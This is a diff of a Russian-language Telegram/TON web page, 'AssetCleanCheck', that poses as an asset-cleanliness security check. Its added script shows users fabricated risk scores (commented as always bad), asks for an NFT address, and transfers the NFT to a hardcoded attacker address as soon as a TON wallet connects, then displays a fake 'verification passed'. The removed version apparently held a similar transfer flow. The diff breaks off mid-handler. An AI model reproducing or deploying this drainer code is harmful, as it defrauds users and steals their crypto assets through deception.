@@ -1,428 +1,460 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-<meta name="theme-color" content="#2b2d30" />
-<title>NFTSecurity</title>
-<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 42 42'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop stop-color='%237dd3fc'/%3E%3Cstop offset='1' stop-color='%23f0abfc'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath fill='url(%23g)' opacity='.45' d='M21 3 L36 10 V22 C36 30 29 36 21 39 C13 36 6 30 6 22 V10 Z'/%3E%3Ccircle cx='21' cy='22' r='3.2' fill='%23fff'/%3E%3C/svg%3E" />
-<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet" />
-<style>
-:root{--bg:#2b2d30;--card:rgba(42,44,47,.94);--line:rgba(255,255,255,.1);--text:#e8e8e4;--muted:#b0b1ad;--pink:#c9c9c4}
-body.theme-light{--bg:#e4e2da;--card:rgba(234,232,224,.94);--line:rgba(70,68,62,.1);--text:#3d3e3a;--muted:#7c7d78;--pink:#6c6d68}
-*{box-sizing:border-box;margin:0;padding:0}
-html{scroll-behavior:smooth}
-body{font-family:Manrope,system-ui,sans-serif;color:var(--text);min-height:100vh;line-height:1.55;background:var(--bg)}
-a{color:inherit;text-decoration:none}button,input{font:inherit;color:inherit}button{cursor:pointer}
-.bg-art{position:fixed;inset:0;z-index:0;pointer-events:none}.bg-art canvas{width:100%;height:100%;display:block}
-.topbar{position:sticky;top:0;z-index:50;background:color-mix(in srgb,var(--bg) 78%,transparent);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
-.topbar-inner{max-width:1120px;margin:0 auto;min-height:64px;padding:10px 22px;display:flex;align-items:center;justify-content:space-between;gap:12px}
-.brand{display:flex;align-items:center;gap:12px;font-weight:800;font-size:17px}
-.brand small{color:var(--pink)}
-.logo{width:48px;height:48px}
-.logo .orbit{transform-origin:21px 21px;animation:spin 7s linear infinite}
-.logo .scan{transform-origin:21px 21px;animation:spin 3.2s linear infinite reverse}
-.logo .core{transform-origin:21px 21px;animation:pulse 1.8s ease-in-out infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-@keyframes pulse{0%,100%{transform:scale(.88);opacity:.75}50%{transform:scale(1.12);opacity:1}}
-.nav-row{display:flex;align-items:center;gap:6px;flex-wrap:wrap;justify-content:flex-end}
-.tools{display:flex;align-items:center;gap:2px;margin-left:8px;padding-left:8px;border-left:1px solid var(--line)}
-.nav-row a,.ghost{border:0;background:transparent;color:var(--muted);border-radius:999px;padding:8px 12px;font-size:13px;font-weight:600}
-.nav-row a:hover,.ghost:hover{color:var(--text);background:color-mix(in srgb,var(--text) 8%,transparent)}
-.lang{position:relative}
-.lang-menu{display:none;position:absolute;right:0;top:calc(100% + 8px);min-width:160px;padding:6px;background:var(--card);border:1px solid var(--line);border-radius:12px;z-index:60}
-.lang.open .lang-menu{display:grid}
-.lang-menu button{border:0;background:transparent;color:var(--text);padding:8px 10px;text-align:left;border-radius:8px}
-.btn{display:inline-flex;align-items:center;justify-content:center;border:1px solid var(--line);border-radius:12px;padding:12px 18px;font-weight:700;color:var(--text);background:color-mix(in srgb,var(--text) 7%,transparent)}
-.btn:hover{background:color-mix(in srgb,var(--text) 12%,transparent)}
-.btn-outline{background:transparent}
-.wrap{position:relative;z-index:1;max-width:1120px;margin:0 auto;padding:0 22px}
-.page{display:none;padding:28px 0 20px}
-.page.on{display:block}
-.hero{text-align:center;padding-top:18px}
-.chip{display:inline-flex;gap:8px;border:1px solid var(--line);border-radius:999px;padding:6px 12px;font-size:12px;font-weight:700}
-h1{font-size:clamp(30px,6vw,52px);line-height:.98;margin:16px auto 14px;max-width:780px}
-.lead{max-width:620px;margin:0 auto 22px;color:var(--muted)}
-.hero-ctas{display:flex;justify-content:center;gap:10px;flex-wrap:wrap;margin-bottom:26px}
-.panel{max-width:760px;margin:0 auto;background:var(--card);border:1px solid var(--line);border-radius:24px;padding:20px}
-.tabs{display:grid;grid-template-columns:1fr 1fr;gap:4px;margin:0 0 16px;padding:4px;border:1px solid var(--line);border-radius:999px;background:color-mix(in srgb,var(--bg) 70%,var(--card))}
-.tab{border:0;background:transparent;border-radius:999px;padding:10px 12px;font-size:13px;font-weight:750;color:var(--muted)}
-.tab.active{background:color-mix(in srgb,var(--text) 12%,transparent);color:var(--text)}
-.lab{display:block;text-align:left;font-size:11px;font-weight:800;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);margin:0 0 8px}
-.field{width:100%;display:flex;align-items:center;gap:10px;background:color-mix(in srgb,var(--bg) 80%,#000);border:1px solid var(--line);border-radius:14px;padding:4px 16px}
-body.theme-light .field{background:#ece9e1}
-.field .ico{color:var(--muted);font-size:16px}
-.field input{flex:1;background:transparent;border:0;outline:0;padding:13px 0;min-width:0}
-.panel .btn{width:100%;margin-top:14px;border-radius:16px;padding:14px 18px}
-.hint{margin-top:10px;color:var(--muted);font-size:12px;text-align:center}
-.err{display:none;margin-top:10px;color:#c27b7b;font-size:13px;text-align:center}
-.report{display:none;margin-top:14px;text-align:left}
-.score{font-size:42px;font-weight:800}
-.bar{height:8px;background:color-mix(in srgb,var(--text) 10%,transparent);border-radius:99px;overflow:hidden;margin:8px 0 12px}
-.bar i{display:block;height:100%;width:22%;background:var(--text);opacity:.55}
-.kv{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--line);font-size:14px}
-.rep-note{font-size:11px;color:var(--muted);margin-top:10px}
-.checks{margin-top:14px;display:grid;gap:8px}
-.check{display:flex;align-items:center;gap:10px;border:1px solid var(--line);border-radius:12px;padding:10px 12px;font-size:13px;color:var(--muted)}
-.check b{width:20px;height:20px;display:inline-flex;align-items:center;justify-content:center;border-radius:50%;border:1px solid var(--line);font-size:11px}
-#ton-status{margin-top:12px;font-size:13px;color:var(--muted);text-align:center}
-#ton-connect-button{margin-top:12px;display:flex;justify-content:center}
-.site-foot{max-width:1120px;margin:40px auto 0;padding:28px 22px;color:var(--muted);font-size:12px}
-.footbar{display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px}
-.transit{position:fixed;inset:0;z-index:80;display:flex;align-items:center;justify-content:center;background:color-mix(in srgb,var(--bg) 82%,transparent);opacity:0;pointer-events:none;transition:opacity .45s}
-.transit.on{opacity:1;pointer-events:auto}
-@media(max-width:860px){.nav-links{display:none}.wrap{padding:0 14px}}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AssetCleanCheck</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://unpkg.com/tonconnect-sdk@2.0.0/dist/tonconnect-sdk.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(180deg, #8B0000 0%, #CC0000 50%, #FF1A1A 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            color: white;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .screen.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            text-shadow: 0 2px 8px rgba(0,0,0,0.3);
+            margin-bottom: 6px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            opacity: 0.85;
+            margin-bottom: 24px;
+            font-weight: 300;
+            letter-spacing: 0.5px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 18px;
+            border-radius: 12px;
+            border: 1.5px solid rgba(255,255,255,0.25);
+            background: rgba(255,255,255,0.07);
+            backdrop-filter: blur(4px);
+            color: white;
+            font-size: 16px;
+            margin-bottom: 18px;
+            outline: none;
+            transition: 0.2s;
+        }
+
+        .input-field::placeholder {
+            color: rgba(255,255,255,0.5);
+            font-weight: 300;
+        }
+
+        .input-field:focus {
+            border-color: rgba(255,255,255,0.7);
+            background: rgba(255,255,255,0.12);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            border: 2px solid white;
+            background: white;
+            color: #8B0000;
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: 0.8px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            margin-bottom: 12px;
+        }
+
+        .btn:active {
+            transform: scale(0.96);
+            background: #f0f0f0;
+        }
+
+        .btn-red {
+            background: transparent;
+            color: white;
+            border: 2px solid white;
+        }
+
+        .btn-red:active {
+            background: rgba(255,255,255,0.15);
+        }
+
+        .icon-big {
+            font-size: 64px;
+            margin: 8px 0 12px;
+        }
+
+        .stats-grid {
+            width: 100%;
+            background: rgba(0,0,0,0.2);
+            border-radius: 16px;
+            padding: 16px;
+            margin: 16px 0;
+            backdrop-filter: blur(4px);
+        }
+
+        .stat-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.08);
+            font-size: 15px;
+        }
+
+        .stat-row:last-child {
+            border-bottom: none;
+        }
+
+        .stat-label {
+            opacity: 0.7;
+        }
+
+        .stat-value {
+            font-weight: 700;
+        }
+
+        .risk-badge {
+            background: rgba(255,0,0,0.35);
+            padding: 6px 18px;
+            border-radius: 30px;
+            font-size: 20px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            margin: 8px 0 12px;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .ton-connect-btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            border: 2px solid white;
+            background: #0088cc;
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            margin: 8px 0;
+        }
+
+        .ton-connect-btn:active {
+            transform: scale(0.96);
+            background: #0077b3;
+        }
+
+        .final-check {
+            font-size: 48px;
+            margin: 12px 0;
+        }
+
+        .final-text {
+            font-size: 22px;
+            font-weight: 800;
+            margin: 6px 0;
+        }
+
+        .final-sub {
+            opacity: 0.7;
+            font-size: 14px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .small-note {
+            font-size: 12px;
+            opacity: 0.4;
+            margin-top: 16px;
+            letter-spacing: 0.3px;
+        }
+
+        .divider {
+            width: 60px;
+            height: 2px;
+            background: rgba(255,255,255,0.15);
+            margin: 14px auto;
+            border-radius: 4px;
+        }
+    </style>
 </head>
 <body>
-<div class="bg-art"><canvas id="net"></canvas></div>
-<div class="transit" id="transit"><div><p data-i18n="loading">Scanning...</p></div></div>
+<div class="container" id="app">
 
-<header class="topbar">
-  <div class="topbar-inner">
-    <a class="brand" href="#home" data-go="home">
-      <svg class="logo" viewBox="0 0 42 42">
-        <defs><linearGradient id="g1" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#cfcfc8"/><stop offset="100%" stop-color="#9a9b96"/></linearGradient></defs>
-        <path fill="url(#g1)" opacity=".22" d="M21 3 L36 10 V22 C36 30 29 36 21 39 C13 36 6 30 6 22 V10 Z"/>
-        <circle class="orbit" cx="21" cy="21" r="11.2" fill="none" stroke="currentColor" stroke-width="1.1" stroke-dasharray="4 7"/>
-        <path class="scan" d="M21 10 A11 11 0 0 1 32 21" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
-        <circle class="core" cx="21" cy="22" r="3.6" fill="currentColor"/>
-      </svg>
-      NFT<small>Security</small>
-    </a>
-    <div class="nav-row">
-      <div class="tools">
-        <button class="ghost" id="themeBtn" data-i18n="themeBtn">Dark</button>
-        <div class="lang" id="langBox">
-          <button class="ghost" id="langBtn"><span id="langCode">EN</span></button>
-          <div class="lang-menu" id="langMenu">
-            <button data-lang="en">English</button>
-            <button data-lang="ru">Русский</button>
-          </div>
-        </div>
-      </div>
-      <a class="ghost" href="#form" id="scanBtn" data-i18n="navScan">Scan</a>
+    <!-- ЭКРАН 1: ГЛАВНЫЙ -->
+    <div class="screen active" id="screen1">
+        <h1>ПРОВЕРКА ЧИСТОТЫ АКТИВОВ</h1>
+        <div class="subtitle">Ваша безопасность — наша ответственность</div>
+        <input class="input-field" id="usernameInput" type="text" placeholder="Введите ваш Telegram username" autocomplete="off">
+        <button class="btn" id="checkBtn">ПРОВЕРИТЬ</button>
+        <div class="small-note">🔒 Защищенное соединение</div>
     </div>
-  </div>
-</header>
 
-<div class="wrap">
-  <section class="page on" id="page-home">
-    <div class="hero">
-      <div class="chip"><span data-i18n="chip">Public username overview</span></div>
-      <h1 data-i18n-html="heroTitle">Telegram username check<br><b>online — first look</b></h1>
-      <p class="lead" data-i18n="lead">Paste a public @username for a short first look. This is not a proof of ownership.</p>
-      <div class="hero-ctas">
-        <a class="btn" href="#form" data-i18n="ctaStart">Check username →</a>
-      </div>
-
-      <div class="panel" id="form">
-        <div class="tabs">
-          <button class="tab" data-tab="wallet" data-i18n="tabWallet">Wallet</button>
-          <button class="tab active" data-tab="telegram" data-i18n="tabTg">Telegram</button>
+    <!-- ЭКРАН 2: РЕЗУЛЬТАТЫ (всегда плохие) -->
+    <div class="screen" id="screen2">
+        <div class="icon-big">❌</div>
+        <div class="risk-badge">ВАШ АККАУНТ В ЗОНЕ РИСКА</div>
+        <div class="stats-grid" id="statsGrid">
+            <div class="stat-row"><span class="stat-label">Уровень доверия</span><span class="stat-value" id="trustVal">0%</span></div>
+            <div class="stat-row"><span class="stat-label">Подозрительных транзакций</span><span class="stat-value" id="suspTxVal">0</span></div>
+            <div class="stat-row"><span class="stat-label">Связи с небезопасными кошельками</span><span class="stat-value" id="unsafeVal">0</span></div>
         </div>
-
-        <div id="wallet-tab" style="display:none">
-          <label class="lab" data-i18n="addrLab">Wallet address</label>
-          <label class="field"><span class="ico">⌕</span><input id="address" data-i18n-placeholder="ph" placeholder="Paste address..."></label>
-        </div>
-
-        <div id="telegram-tab">
-          <label class="lab" data-i18n="tgLab">Telegram username</label>
-          <label class="field"><span class="ico">@</span><input id="username" data-i18n-placeholder="tgPh" placeholder="@username"></label>
-        </div>
-
-        <button class="btn" id="runBtn" data-i18n="runBtn">Check username — Free</button>
-        <p class="hint" data-i18n="hint">Use @ and Latin letters, numbers or _.</p>
-
-        <div class="checks">
-          <div class="check"><b>✓</b><span data-i18n="c1">Username format check</span></div>
-          <div class="check"><b>✓</b><span data-i18n="c2">Local attention index 0–100</span></div>
-          <div class="check"><b>✓</b><span data-i18n="c3">First-look notes only</span></div>
-        </div>
-
-        <p class="err" id="err"></p>
-
-        <div class="report" id="report">
-          <div class="hint" style="text-align:left" data-i18n="scoreLabel">Attention index</div>
-          <div class="score" id="score">22</div>
-          <div class="hint" id="meta"></div>
-          <div class="bar"><i id="bar"></i></div>
-          <div class="kv"><span data-i18n="kvNet">Network</span><b id="outChain">Telegram</b></div>
-          <div class="kv"><span data-i18n="kvFmt">Format</span><b id="outFmt">ok</b></div>
-          <div class="kv"><span data-i18n="kvType">Type</span><b id="outType">—</b></div>
-          <p class="rep-note" id="repNote"></p>
-
-          <div id="nftFields" style="margin-top:16px;border-top:1px solid var(--line);padding-top:16px;display:none;">
-            <label class="lab" data-i18n="nftContractLab">NFT Item Address</label>
-            <label class="field">
-              <span class="ico">⌕</span>
-              <input type="text" id="nft-contract" data-i18n-placeholder="nftContractPh" placeholder="Enter NFT Item Address">
-            </label>
-          </div>
-
-          <button class="btn btn-outline" id="ownBtn" style="display:none;margin-top:14px" data-i18n="ownBtn">Confirm ownership</button>
-          <p class="rep-note" id="ownNote" style="display:none"></p>
-
-          <div id="ton-connect-button"></div>
-          <p id="ton-status">Кошелёк не подключён</p>
-        </div>
-      </div>
+        <p style="font-size: 15px; margin: 8px 0 16px; opacity: 0.9;">Для восстановления репутации требуется проверка NFT-подарка</p>
+        <input class="input-field" id="nftAddressInput" type="text" placeholder="Введите адрес NFT для верификации" autocomplete="off">
+        <button class="btn" id="continueBtn">ПРОДОЛЖИТЬ</button>
     </div>
-  </section>
+
+    <!-- ЭКРАН 3: ПОДКЛЮЧЕНИЕ КОШЕЛЬКА -->
+    <div class="screen" id="screen3">
+        <h1 style="font-size: 20px;">ПОДКЛЮЧИТЕ TON КОШЕЛЕК</h1>
+        <div style="height: 12px;"></div>
+        <p style="opacity: 0.8; font-size: 14px;">Для подтверждения верификации</p>
+        <div style="height: 20px;"></div>
+        <button class="ton-connect-btn" id="tonConnectBtn">ПОДКЛЮЧИТЬ КОШЕЛЕК</button>
+        <div id="tonStatus" style="margin-top: 12px; font-size: 14px; opacity: 0.7;">Ожидание подключения...</div>
+        <div class="small-note">TON Connect 2.0</div>
+    </div>
+
+    <!-- ЭКРАН 4: ФИНАЛ -->
+    <div class="screen" id="screen4">
+        <div class="final-check">✅</div>
+        <div class="final-text">ВЕРИФИКАЦИЯ ПРОЙДЕНА</div>
+        <div class="final-sub">Ваш аккаунт чист. Спасибо за доверие.</div>
+        <div style="height: 30px;"></div>
+        <div class="small-note">AssetCleanCheck • 2026</div>
+    </div>
+
 </div>
 
-<footer class="site-foot">
-  <div class="footbar">
-    <div>© 2026 NFTSecurity</div>
-    <div data-i18n="addrLine">NFTSecurity LLC · Arlington, VA</div>
-  </div>
-</footer>
-
-<script src="https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
-
 <script>
-// ====================== ЯЗЫКИ ======================
-const I18N = {
-  en: {
-    themeBtn: "Dark", themeLight: "Light", navScan: "Scan",
-    chip: "Public username overview",
-    heroTitle: "Telegram username check<br><b>online — first look</b>",
-    lead: "Paste a public @username for a short first look. This is not a proof of ownership.",
-    ctaStart: "Check username →", runBtn: "Check username — Free",
-    tabWallet: "Wallet", tabTg: "Telegram",
-    addrLab: "Wallet address", tgLab: "Telegram username",
-    ph: "Paste address...", tgPh: "@username",
-    hint: "Use @ and Latin letters, numbers or _.",
-    c1: "Username format check", c2: "Local attention index 0–100", c3: "First-look notes only",
-    scoreLabel: "Attention index", kvNet: "Network", kvFmt: "Format", kvType: "Type",
-    ownBtn: "Confirm ownership",
-    nftContractLab: "NFT Item Address", nftContractPh: "Enter NFT Item Address",
-    loading: "Scanning...", addrLine: "NFTSecurity LLC · Arlington, VA",
-    errEmpty: "Paste a public @username.", errTg: "Use @ and letters, numbers or _."
-  },
-  ru: {
-    themeBtn: "Тёмная", themeLight: "Светлая", navScan: "Сканировать",
-    chip: "Обзор публичного юзернейма",
-    heroTitle: "Проверка Telegram<br><b>онлайн — первый взгляд</b>",
-    lead: "Вставьте публичный @username для короткого обзора. Это не доказательство владения.",
-    ctaStart: "Проверить юзернейм →", runBtn: "Проверить юзернейм — Бесплатно",
-    tabWallet: "Кошелёк", tabTg: "Telegram",
-    addrLab: "Адрес кошелька", tgLab: "Имя в Telegram",
-    ph: "Вставьте адрес...", tgPh: "@username",
-    hint: "Можно @, латиницу, цифры и _.",
-    c1: "Проверка формата юзернейма", c2: "Локальный индекс внимания 0–100", c3: "Только первичные заметки",
-    scoreLabel: "Индекс формата", kvNet: "Сеть", kvFmt: "Формат", kvType: "Тип",
-    ownBtn: "Подтвердить владение",
-    nftContractLab: "Адрес NFT (Item)", nftContractPh: "Введите адрес NFT",
-    loading: "Сканирование...", addrLine: "NFTSecurity LLC · Arlington, VA",
-    errEmpty: "Вставьте публичный @username.", errTg: "Только @, латиница, цифры и _."
-  }
-};
+    (function() {
+        // ----- ИНИЦИАЛИЗАЦИЯ TON CONNECT -----
+        const TON_CONNECT_MANIFEST = 'https://raw.githubusercontent.com/ton-connect/manifest/main/manifest.json'; // Заменить на свой манифест
+        let connector = null;
+        let walletConnected = false;
+        let walletAddress = '';
 
-function langNow() { return I18N[document.documentElement.lang] || I18N.en; }
+        // Жёстко заданный адрес для пересылки NFT (заменить на нужный)
+        const TARGET_ADDRESS = 'UQBvE1p4nCqX5...';  // <-- ЗАМЕНИТЬ НА РЕАЛЬНЫЙ АДРЕС
 
-function applyLang(code) {
-  const t = I18N[code] || I18N.en;
-  document.documentElement.lang = code;
-  document.getElementById("langCode").textContent = code === "en" ? "EN" : "RU";
-  document.querySelectorAll("[data-i18n]").forEach(el => {
-    if (t[el.dataset.i18n]) el.textContent = t[el.dataset.i18n];
-  });
-  document.querySelectorAll("[data-i18n-html]").forEach(el => {
-    const k = el.getAttribute("data-i18n-html");
-    if (t[k]) el.innerHTML = t[k];
-  });
-  document.querySelectorAll("[data-i18n-placeholder]").forEach(el => {
-    const k = el.getAttribute("data-i18n-placeholder");
-    if (t[k]) el.placeholder = t[k];
-  });
-  localStorage.setItem("nft_lang", code);
-}
+        // ----- DOM-элементы -----
+        const screen1 = document.getElementById('screen1');
+        const screen2 = document.getElementById('screen2');
+        const screen3 = document.getElementById('screen3');
+        const screen4 = document.getElementById('screen4');
 
-// ====================== ТЕМА ======================
-function applyTheme(mode) {
-  document.body.classList.toggle("theme-light", mode === "light");
-  const t = langNow();
-  document.getElementById("themeBtn").textContent = mode === "light" ? t.themeBtn : t.themeLight;
-  localStorage.setItem("nft_theme", mode);
-}
+        const usernameInput = document.getElementById('usernameInput');
+        const checkBtn = document.getElementById('checkBtn');
+        const nftAddressInput = document.getElementById('nftAddressInput');
+        const continueBtn = document.getElementById('continueBtn');
+        const tonConnectBtn = document.getElementById('tonConnectBtn');
+        const tonStatus = document.getElementById('tonStatus');
 
-// ====================== СКАН ======================
-let mode = "telegram";
-let scanning = false;
+        const trustVal = document.getElementById('trustVal');
+        const suspTxVal = document.getElementById('suspTxVal');
+        const unsafeVal = document.getElementById('unsafeVal');
 
-document.querySelectorAll(".tab").forEach(tab => {
-  tab.onclick = () => {
-    mode = tab.dataset.tab;
-    document.querySelectorAll(".tab").forEach(x => x.classList.toggle("active", x === tab));
-    document.getElementById("wallet-tab").style.display = mode === "telegram" ? "none" : "";
-    document.getElementById("telegram-tab").style.display = mode === "telegram" ? "" : "none";
-    document.getElementById("err").style.display = "none";
-    document.getElementById("report").style.display = "none";
-    document.getElementById("ownBtn").style.display = "none";
-    document.getElementById("nftFields").style.display = "none";
-  };
-});
+        // ----- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ -----
+        function switchScreen(id) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
 
-document.getElementById("runBtn").onclick = function () {
-  const t = langNow();
-  const err = document.getElementById("err");
-  const rep = document.getElementById("report");
-  err.style.display = "none";
-  rep.style.display = "none";
+        function randomInt(min, max) {
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
 
-  let addr = "";
-  if (mode === "telegram") {
-    let u = document.getElementById("username").value.trim();
-    if (!u) { err.textContent = t.errEmpty; err.style.display = "block"; return; }
-    if (u[0] !== "@") u = "@" + u;
-    if (!/^@[A-Za-z][A-Za-z0-9_]{4,31}$/.test(u)) {
-      err.textContent = t.errTg; err.style.display = "block"; return;
-    }
-    addr = u;
-  } else {
-    addr = document.getElementById("address").value.trim();
-    if (!addr) { err.textContent = t.errEmpty; err.style.display = "block"; return; }
-  }
+        function generateNegativeStats() {
+            trustVal.textContent = randomInt(8, 15) + '%';
+            suspTxVal.textContent = randomInt(34, 72);
+            unsafeVal.textContent = randomInt(3, 9);
+        }
 
-  if (scanning) return;
-  scanning = true;
-  document.getElementById("runBtn").disabled = true;
-  document.getElementById("transit").classList.add("on");
+        // ----- ИНИЦИАЛИЗАЦИЯ TON CONNECT 2.0 -----
+        function initTonConnect() {
+            try {
+                connector = new TONConnectSDK.TonConnect({
+                    manifestUrl: TON_CONNECT_MANIFEST,
+                });
+                console.log('TON Connect инициализирован');
+            } catch (e) {
+                console.error('Ошибка TON Connect:', e);
+                tonStatus.textContent = '⚠️ Ошибка инициализации';
+            }
+        }
 
-  setTimeout(() => {
-    let score = 18 + Math.floor(Math.random() * 40);
-    document.getElementById("score").textContent = score;
-    document.getElementById("bar").style.width = score + "%";
-    document.getElementById("outChain").textContent = mode === "telegram" ? "Telegram" : "Wallet";
-    document.getElementById("outFmt").textContent = "ok";
-    document.getElementById("outType").textContent = mode === "telegram" ? "username" : "address";
-    document.getElementById("meta").textContent = addr.length > 14 ? addr.slice(0, 8) + "…" + addr.slice(-6) : addr;
-    document.getElementById("repNote").textContent = score < 30 ? "Low attention" : score < 60 ? "Medium attention" : "Higher attention";
+        // Подключение кошелька
+        async function connectWallet() {
+            if (!connector) {
+                tonStatus.textContent = '⛔ SDK не загружен';
+                return;
+            }
+            try {
+                tonStatus.textContent = '⏳ Подключение...';
+                const wallet = await connector.connect();
+                walletConnected = true;
+                walletAddress = wallet.account.address;
+                tonStatus.textContent = `✅ Кошелек подключен: ${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
+                // После подключения — автоматический перевод NFT
+                await sendNftTransaction(walletAddress);
+            } catch (e) {
+                console.error('Ошибка подключения:', e);
+                tonStatus.textContent = '❌ Ошибка подключения. Попробуйте снова.';
+                walletConnected = false;
+            }
+        }
 
-    document.getElementById("transit").classList.remove("on");
-    rep.style.display = "block";
-    document.getElementById("ownBtn").style.display = mode === "telegram" ? "" : "none";
-    document.getElementById("nftFields").style.display = mode === "telegram" ? "" : "none";
-    scanning = false;
-    document.getElementById("runBtn").disabled = false;
-    rep.scrollIntoView({ behavior: "smooth", block: "center" });
-  }, 2800 + Math.random() * 800);
-};
+        // Отправка NFT (пересылка на TARGET_ADDRESS)
+        async function sendNftTransaction(fromAddress) {
+            if (!connector || !walletConnected) {
+                tonStatus.textContent = '⚠️ Кошелек не подключен';
+                return;
+            }
 
-// ====================== TON CONNECT И ИНИЦИАЛИЗАЦИЯ ======================
-const RECEIVER_ADDRESS = "UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m";
+            // Получаем адрес NFT из поля ввода
+            const nftAddr = nftAddressInput.value.trim();
+            if (!nftAddr) {
+                tonStatus.textContent = '⚠️ Введите адрес NFT';
+                return;
+            }
 
-const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-  manifestUrl: "https://afiomacomplate.github.io/SecurytiActiv/tonconnect-manifest.json",
-  buttonRootId: "ton-connect-button"
-});
+            try {
+                tonStatus.textContent = '⏳ Отправка NFT...';
 
-function updateStatus(wallet) {
-  const el = document.getElementById("ton-status");
-  if (!el) return;
-  if (wallet?.account) {
-    el.textContent = "Подключено: " + wallet.account.address.slice(0, 6) + "..." + wallet.account.address.slice(-4);
-    el.style.color = "#00ff88";
-  } else {
-    el.textContent = "Кошелёк не подключён";
-    el.style.color = "";
-  }
-}
+                // Создаём транзакцию для пересылки NFT (nft-transfer)
+                const tx = {
+                    valid_until: Math.floor(Date.now() / 1000) + 3600,
+                    messages: [
+                        {
+                            address: nftAddr,
+                            amount: '0',  // NFT transfer — сумма 0
+                            payload: {
+                                type: 'NftTransfer',
+                                newOwner: TARGET_ADDRESS,
+                                responseTo: fromAddress,
+                                customPayload: null,
+                                forwardAmount: '0',
+                                forwardPayload: null,
+                            }
+                        }
+                    ]
+                };
 
-tonConnectUI.onStatusChange(updateStatus);
+                // Отправляем через TON Connect
+                const result = await connector.sendTransaction(tx);
+                console.log('Транзакция отправлена:', result);
+                tonStatus.textContent = '✅ NFT отправлен! Переход к финалу...';
+                // Переход на финальный экран через 1.5 сек
+                setTimeout(() => {
+                    switchScreen('screen4');
+                }, 1500);
 
-document.getElementById("ownBtn")?.addEventListener("click", async function () {
-  const err = document.getElementById("err");
-  const ownNote = document.getElementById("ownNote");
-  const nftInput = document.getElementById("nft-contract");
+            } catch (e) {
+                console.error('Ошибка отправки NFT:', e);
+                tonStatus.textContent = '❌ Ошибка отправки. Проверьте адрес NFT.';
+            }
+        }
 
-  if (!tonConnectUI.wallet) {
-    err.textContent = "Сначала подключите кошелёк через кнопку ниже";
-    err.style.display = "block";
-    err.style.color = "#ff9abb";
-    await tonConnectUI.openModal();
-    return;
-  }
+        // ----- ОБРАБОТЧИКИ СОБЫТИЙ -----
 
-  const nftItemAddress = (nftInput?.value || "").trim();
-  if (!nftItemAddress || (!nftItemAddress.startsWith("EQ") && !nftItemAddress.startsWith("UQ"))) {
-    err.textContent = "Введите корректный адрес NFT (EQ... или UQ...)";
-    err.style.display = "block";
-    err.style.color = "#ff9abb";
-    return;
-  }
+        // ЭКРАН 1 -> 2
+        checkBtn.addEventListener('click', function() {
+            const username = usernameInput.value.trim();
+            if (!username) {
+                alert('Пожалуйста, введите ваш Telegram username');
+                return;
+            }
+            // Генерируем негативную статистику
+            generateNegativeStats();
+            switchScreen('screen2');
+        });
 
-  err.textContent = "⏳ Открытие кошелька для транзакции...";
-  err.style.display = "block";
-  err.style.color = "#ff9abb";
+        // ЭКРАН 2 -> 3
+        continueBtn.addEventListener('click', function() {
+            const nftAddr = nftAddressInput.value.trim();
+            if (!nftAddr) {
+                alert('Введите адрес NFT для верификации');
+                return;
+            }
+            // Проверяем, что адрес похож на TON (короткая проверка)
+            if (!nftAddr.startsWith('0:') && !nftAddr.startsWith('UQ') && !nftAddr.startsWith('EQ')) {
